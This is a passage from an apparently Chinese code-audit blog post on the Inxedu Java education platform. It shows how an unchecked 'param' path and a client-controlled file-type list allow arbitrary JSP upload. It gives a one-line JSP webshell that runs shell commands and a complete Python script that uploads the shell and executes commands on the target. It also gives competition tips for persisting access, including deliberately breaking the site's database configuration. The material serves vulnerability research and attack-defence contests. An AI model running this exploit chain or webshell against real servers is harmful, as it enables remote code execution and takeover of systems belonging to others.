[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135030815-5e648619-e4b9-43c0-82cd-381385534da8.png#align=left&amp;display=inline&amp;height=118&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=118&amp;originWidth=2006&amp;size=35740&amp;status=done&amp;style=none&amp;width=2006)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135051434-becf0660-8e68-4ad1-9e16-3b01acb1cc86.png#align=left&amp;display=inline&amp;height=628&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=628&amp;originWidth=1390&amp;size=307448&amp;status=done&amp;style=none&amp;width=1390)

关于这个点触发点比较多,有兴趣读者可以自行跟一下。

读者如果对此还是不甚了解,[Mybatis从认识到了解 ](https://www.e-learn.cn/content/java/1384478),可以先阅读下此文。

**任意文件上传挖掘思路**

`/src/main/java/com/inxedu/os/common/controller/VideoUploadController.java`

```
@Controller
@RequestMapping("/video")
public class VideoUploadController extends BaseController`{`
................

    /**
     * 视频上传
     */
    @RequestMapping(value="/uploadvideo",method=`{`RequestMethod.POST`}`)
    public String gok4(HttpServletRequest request,HttpServletResponse response,@RequestParam(value="uploadfile" ,required=true) MultipartFile uploadfile,
            @RequestParam(value="param",required=false) String param,
            @RequestParam(value="fileType",required=true) String fileType)`{`
        try`{`

            String[] type = fileType.split(",");
            //设置图片类型
            setFileTypeList(type);
            //获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名
            String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());
            if(!fileType.contains(ext))`{`
                return responseErrorData(response,1,"文件格式错误，上传失败。");
            `}`
            //获取文件路径
            String filePath = getPath(request,ext,param);
            File file = new File(getProjectRootDirPath(request)+filePath);

            //如果目录不存在，则创建
            if(!file.getParentFile().exists())`{`
                file.getParentFile().mkdirs();
            `}`
            //保存文件
            uploadfile.transferTo(file);
            //返回数据

            return responseData(filePath,0,"上传成功",response);
        `}`catch (Exception e) `{`
            logger.error("gok4()--error",e);
            return responseErrorData(response,2,"系统繁忙，上传失败");
        `}`
    `}`
..........................

`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135064536-6c073e61-ddc7-4842-94f5-68be3c7e7f1f.png#align=left&amp;display=inline&amp;height=974&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=974&amp;originWidth=2214&amp;size=346935&amp;status=done&amp;style=none&amp;width=2214)

我们跟进下`getPath`函数

```
private String getPath(HttpServletRequest request,String ext,String param)`{`
        String filePath = "/images/upload/";
        if(param!=null &amp;&amp; param.trim().length()&gt;0)`{`
            filePath+=param; //这里直接拼接param,所以我们这里可以任意跳转目录
        `}`else`{`
            filePath+=CommonConstants.projectName;
        `}`
        filePath+="/"+ DateUtils.toString(new Date(), "yyyyMMdd")+"/"+System.currentTimeMillis()+"."+ext;
        return filePath;
    `}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135076374-2bb56a15-33ed-4773-9fbf-2c64e65bfe7c.png#align=left&amp;display=inline&amp;height=860&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=860&amp;originWidth=2712&amp;size=273281&amp;status=done&amp;style=none&amp;width=2712)

接着访问下:

`http://127.0.0.1:82/images/upload/20200127/1580125876609.jsp?i=ls`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135095945-772d973a-a70a-4118-921e-3b3e1ebb3f20.png#align=left&amp;display=inline&amp;height=682&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=682&amp;originWidth=1758&amp;size=70310&amp;status=done&amp;style=none&amp;width=1758)

我们已经拿到没有回显的shell了。



## 0x6 登顶赛维持权限小技巧

上次打湖湘杯下午场第一次接触登顶赛这种类型, 当时脑子都是在想什么高端操作，什么修改权限,秒修漏洞啥的，赛后出来我才明白，最简单最傻b的方法往往最有效。

> <ol>
- 通过漏洞拿到webshell
- 直接修改网站配置文件,修改数据库配置让网站挂掉,让功能没办法访问,自己记得修改了什么地方。
- 写脚本不断发包去生成webshell,然后去请求,执行修改文件内容为你的队名的操作。
</ol>
(这里要跑两个线程一个是请求生成shell,一个是稳定shell)
<ol>
- 接近判断时间的时候,让网站正常回来即可。
</ol>

下面是我自己写的简陋版本,后面我会将其框架化,并加入session管理。

这里要注意shell这样来拼接,要不然echo命令用不了:

`&lt;%Runtime.getRuntime().exec(new String[]`{`"/bin/sh","-c",request.getParameter("cmd")`}`);%&gt;`

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

import requests
import urllib.parse
import re
import threading

debug = True

def g1(host):
    url = 'http://' + host + '/' +'video/uploadvideo?&amp;param=temp&amp;fileType=jsp'
    # 这里需要修改下shell名字,上传name等配置
    files = `{`'uploadfile': ('shell.jsp', open('shell.jsp', 'rb'))`}`
    if debug:
        print("url:n" + url)
        print(files)
    rText = requests.post(url, files=files, timeout=5).text
    # 这里是shell路径匹配正则
    shellRegex = re.compile('"url":"(.*?)"')
    if(shellRegex.search(rText)):
        shellPath = shellRegex.search(rText)[1]
        if debug:
            print("shellPath:n" + shellPath)
        # 开始拼接shell
        shellURL = 'http://' + host + shellPath
        if debug:
            print("shellURL:n" + shellURL )
        print("[+]Success,get Shell: `{``}`".format(shellURL))
        return shellURL
    else:
        print("[-] Error, no shell!!!")
        return False

def getShell(host):
    print("[+]Staring getShell.....".center(100,'*'))
    shellList = []
    # request 发包
    s1 = g1(host)
    # socket 自定义协议包发送
    # s2 = g2(url)
    if(s1):
        shellList.append(s1)
    return shellList

def requestShell(shellURL, cmd, password):
    print("[+]Staring requestShell.....".center(100,'='))
    # 检查shell存活性
    if debug:
        print(shellURL)
    for u in shellURL:
        code = requests.get(u).status_code
        if(code != 404):
            # 开始创建请求线程
            print("[+] now, subThread requesting......")
            t = threading.Thread(target=work, args=(u, cmd, password,))
            t.start()
            t.join()
            return True
        else:
            print("[-]Error,404,shell:`{``}`".format(u))
            return False


def work(u, cmd, password):
    print("work Function................")
    param = urllib.parse.quote('?' + password + '=' + cmd,safe='/?&amp;=', encoding=None, errors=None)
    url = u + param
    if debug:
        print(url)
    r = requests.get(url, timeout=5)
    if(r.status_code == 200):
        print("[+]Success, Execute CMD!!!")
        return True
    else:
        print("[-]Error, Execute CMD Failed!!")

def attack(url):
    shellURL = getShell(url)
    # 执行的命令
    cmd = '''echo "123"&gt;/tmp/shell.txt ''';
    # 连接shell的参数
    password = 'cmd'
    if(shellURL):
        for i in range(2):
            print("n Staring Fuzz:`{``}` n".format(str(i)).center(100,'+'))
            result = requestShell(shellURL, cmd, password)
        if(result):
            print("[+] Success,cmd:`{``}`".format(cmd))
        else:
            print("[-] Error!")
    else:
        print("[-] Error, getshell failed!")

def main():
    Target = ['127.0.0.1:82']
    # 这里可以进行多线程优化,针对批量目标的时候
    for host in Target:
        attack(host)

if __name__ == '__main__':
    main()
```

`shell.jsp`

```
&lt;%Runtime.getRuntime().exec(new String[]`{`"/bin/sh","-c",request.getParameter("cmd")`}`);%&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580135124571-e08082f9-46b4-466d-bf20-7353a0b7008b.png#align=left&amp;display=inline&amp;height=962&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=962&amp;originWidth=1928&amp;size=259906&amp;status=done&amp;style=none&amp;width=1928)



## 0x7 总结

这套系统还有很多值得深入挖掘的点，值得我再去细细分析， 后面的系列我依然会围绕这个系统来展开，探究更多java漏洞的可能性，本文更多的是一种萌新开门篇，重点在配置环境，然后粗浅介绍下系统的漏洞，让读者有直观的现象, 后面我将会从各种底层框架的使用来分析安全成因,并尝试去挖掘一些新的漏洞。



## 0x8 参考链接

[java代码审计文章集合](https://www.cnblogs.com/r00tuser/p/10577571.html)

[JDK、JRE、JVM三者间的关系](https://www.cnblogs.com/zhangzongxing01/p/5559126.html)

[Mac系统安装和配置tomcat步骤详解](https://www.jianshu.com/p/d5a3d34a7de9)

[JAVA代码审计 | 因酷网校在线教育系统](https://xz.aliyun.com/t/2646)

<a>SSM框架审计</a>
